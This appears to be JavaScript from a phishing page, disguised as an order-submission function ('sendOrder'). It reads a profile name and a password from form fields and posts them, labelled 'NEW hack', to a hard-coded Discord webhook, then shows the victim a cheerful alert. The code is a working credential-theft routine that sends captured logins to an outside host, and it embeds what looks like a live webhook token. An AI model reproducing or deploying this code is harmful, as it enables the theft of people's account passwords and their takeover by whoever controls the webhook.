function sendOrder(){

  let text = document.getElementById("text").value;
  let password = document.getElementById("password").value;

  fetch("https://discord.com/api/webhooks/1503039452371751002/GBoURXCgmqZgLUD1gnkNA0jycx_dfhzAUt0giRmbiK9XbZvNHGjjZlsOeq1toMmw3KIy", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content:
`🛒 NEW hack

👤 PROFIL: ${text}
📦 MOT DE PASS: ${password}`

    })
  });

  alert("GOOOOOOOOD!");
}